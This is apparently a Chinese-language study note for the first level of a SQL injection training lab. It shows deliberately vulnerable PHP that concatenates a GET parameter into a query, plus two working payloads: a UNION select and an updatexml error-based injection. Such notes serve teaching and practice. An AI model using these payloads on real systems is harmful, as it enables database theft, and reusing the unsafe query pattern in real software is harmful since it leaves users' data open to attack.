# lesson1

## ​

* **source**： $\_GET\['id'\]

```php
if(isset($_GET['id']))
$id=$_GET['id'];
```



* **sink**：select语句，where条件
  * 闭合形式：单引号

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```



* **output**:

```php
	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

```

* union注入:  通过`$row`

  * 2，3点可控:  `index.php?id=0' union select 1,user(),3 --+`



* 报错注入： 通过 `print_r(mysql_error())`

  * xpath:  `index.php?id=1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

* 盲注：
  * 时间
  * boolean



